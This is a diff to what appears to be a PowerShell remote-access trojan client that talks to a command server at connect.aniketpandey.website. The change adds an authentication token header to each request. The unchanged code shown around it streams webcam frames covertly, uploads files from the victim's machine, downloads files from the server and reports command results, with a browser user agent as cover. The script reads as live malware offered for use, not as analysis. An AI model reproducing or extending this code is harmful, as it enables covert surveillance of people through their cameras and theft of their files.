@@ -2,8 +2,9 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.1"
+$Version = "3.1.2"
 $cfHost = "https://connect.aniketpandey.website"
+$cfToken = "CHANGE_ME_TO_A_SECRET"  # must match server.py TOKEN
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
 $maxChunkBytes = 32000  # cap per-chunk size
@@ -232,6 +233,7 @@ function Send-Http {
     $req = [System.Net.HttpWebRequest]::Create($Url)
     $req.Method = $Method
     $req.UserAgent = "Mozilla/5.0"
+    $req.Headers.Add("X-Token", $cfToken)
     $req.KeepAlive = $true
     $req.Timeout = $TimeoutMs
     $req.ReadWriteTimeout = $TimeoutMs
@@ -354,6 +356,7 @@ function Start-CameraStream {
         try {
             $wc2 = New-Object System.Net.WebClient
             $wc2.Headers.Add('User-Agent','Mozilla/5.0')
+            $wc2.Headers.Add('X-Token',$cfToken)
             $wc2.UploadData("$cfHost/result?id=$clientId", 'POST',
                 [System.Text.Encoding]::UTF8.GetBytes("[!] Camera: WinRT load failed: $($_.Exception.Message)`n")) | Out-Null
             $wc2.Dispose()
@@ -389,14 +392,14 @@ function Await { param(`$op); `$t=[System.WindowsRuntimeSystemExtensions]::AsTas
 function UploadFrame([byte[]]`$data) {
     try {
         `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_frame?id=$clientId')
-        `$r.Method='POST';`$r.ContentType='image/jpeg';`$r.ContentLength=`$data.Length;`$r.Timeout=5000;`$r.ReadWriteTimeout=5000;`$r.UserAgent='Mozilla/5.0'
+        `$r.Method='POST';`$r.ContentType='image/jpeg';`$r.ContentLength=`$data.Length;`$r.Timeout=5000;`$r.ReadWriteTimeout=5000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','CHANGE_ME_TO_A_SECRET')
         `$s=`$r.GetRequestStream();`$s.Write(`$data,0,`$data.Length);`$s.Close();`$r.GetResponse().Close()
     } catch {}
 }
 function ShouldStop {
     try {
         `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_signal?id=$clientId')
-        `$r.Method='GET';`$r.Timeout=3000;`$r.ReadWriteTimeout=3000;`$r.UserAgent='Mozilla/5.0'
+        `$r.Method='GET';`$r.Timeout=3000;`$r.ReadWriteTimeout=3000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','CHANGE_ME_TO_A_SECRET')
         `$resp=`$r.GetResponse();`$val=(New-Object System.IO.StreamReader(`$resp.GetResponseStream())).ReadToEnd().Trim();`$resp.Close()
         return (`$val -eq 'stopstream' -or `$val -eq 'cancel')
     } catch { return `$false }
@@ -420,7 +423,7 @@ try {
     }
     try { `$device.Dispose() } catch {}
 } catch {
-    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: `$(`$_.Exception.Message)`n")) | Out-Null;`$wc.Dispose() } catch {}
+    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.Headers.Add('X-Token','CHANGE_ME_TO_A_SECRET');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: `$(`$_.Exception.Message)`n")) | Out-Null;`$wc.Dispose() } catch {}
 }
 "@
         try {
@@ -438,6 +441,7 @@ try {
             Write-Log "Camera task failed: $($_.Exception.Message)" "WARN"
             try {
                 $wc2 = New-Object System.Net.WebClient; $wc2.Headers.Add('User-Agent','Mozilla/5.0')
+                $wc2.Headers.Add('X-Token',$cfToken)
                 $wc2.UploadData("$cfHost/result?id=$clientId", 'POST',
                     [System.Text.Encoding]::UTF8.GetBytes("[!] Camera task start failed: $($_.Exception.Message)`n")) | Out-Null
                 $wc2.Dispose()
@@ -453,6 +457,7 @@ try {
     $rs.SessionStateProxy.SetVariable('cfHost',      $cfHost)
     $rs.SessionStateProxy.SetVariable('clientId',    $clientId)
     $rs.SessionStateProxy.SetVariable('sharedState', $script:sharedState)
+    $rs.SessionStateProxy.SetVariable('cfToken',    $cfToken)
     $script:cameraRunspace = $rs
 
     $ps = [powershell]::Create()
@@ -486,6 +491,7 @@ try {
                     # Upload frame directly
                     $req = [System.Net.HttpWebRequest]::Create("$cfHost/camera_frame?id=$clientId")
                     $req.Method='POST'; $req.ContentType='image/jpeg'; $req.ContentLength=$bytes.Length
+                    $req.Headers.Add('X-Token', $cfToken)
                     $req.Timeout=5000; $req.ReadWriteTimeout=5000; $req.UserAgent='Mozilla/5.0'
                     $s = $req.GetRequestStream(); $s.Write($bytes, 0, $bytes.Length); $s.Close()
                     $req.GetResponse().Close()
@@ -497,6 +503,7 @@ try {
             try {
                 $wc = New-Object System.Net.WebClient
                 $wc.Headers.Add('User-Agent','Mozilla/5.0')
+$wc.Headers.Add('X-Token', $cfToken)
                 $wc.UploadData("$cfHost/result?id=$clientId", 'POST',
                     [System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: $($_.Exception.Message)`n")) | Out-Null
                 $wc.Dispose()
@@ -1086,6 +1093,8 @@ function Connect-Cloudflare {
                         $fileName = [System.IO.Path]::GetFileName($filePath)
                         $uploadUrl = "$cfHost/upload?id=$clientId&filename=$([Uri]::EscapeDataString($fileName))"
                         $wc = New-Object System.Net.WebClient
+                        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+                        $wc.Headers.Add("X-Token", $cfToken)
                         $wc.UploadData($uploadUrl, "POST", $fileBytes) | Out-Null
                         Send-Result-To-Server -Body "[+] Sent '$filePath' ($($fileBytes.Length) bytes)`n"
                     } catch {
@@ -1105,6 +1114,8 @@ function Connect-Cloudflare {
                             New-Item -ItemType Directory -Path $destDir -Force | Out-Null
                         }
                         $wc = New-Object System.Net.WebClient
+                        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+                        $wc.Headers.Add("X-Token", $cfToken)
                         $wc.Headers.Add("User-Agent", "Mozilla/5.0")
                         $fileBytes = $wc.DownloadData("$cfHost/fetch?id=$clientId")
                         $wc.Dispose()
